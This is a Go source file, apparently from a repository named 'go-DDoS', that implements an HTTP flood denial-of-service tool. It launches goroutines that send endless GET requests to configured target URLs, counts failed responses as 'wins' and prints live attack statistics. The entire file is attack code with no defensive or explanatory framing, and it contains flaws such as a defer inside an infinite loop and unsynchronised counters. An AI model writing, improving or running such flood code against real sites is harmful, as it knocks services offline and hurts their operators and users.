package service

import (
	"fmt"
	"net/http"
	"time"

	"github.com/John-Gatsby/go-DDoS/config"
)

type Service struct {
	cfg   *config.Config
	conn  int
	tries int
	wins  int
}

func New(cfg *config.Config) *Service {
	return &Service{
		cfg: cfg,
	}
}

func (s *Service) Run() {
	go s.print()
	for {
		defer func() {
			if err := recover(); err != nil {
				s.tries = 0
				s.wins = 0
			}
		}()
		if s.conn < s.cfg.Conn {
			for _, url := range s.cfg.Urls {
				go s.attack(url)
				s.conn++
			}
		}
	}

	var ch chan int
	<-ch
}

func (s *Service) attack(url string) {
	for {
		_, err := http.Get(url)
		s.tries++
		if err != nil {
			s.conn--
			s.wins++
			return
		}
	}
}

func (s *Service) print() {
	for {
		fmt.Printf("\r conn: %d tries: %d wins: %d", s.conn, s.tries, s.wins)
		time.Sleep(time.Second)
	}
}
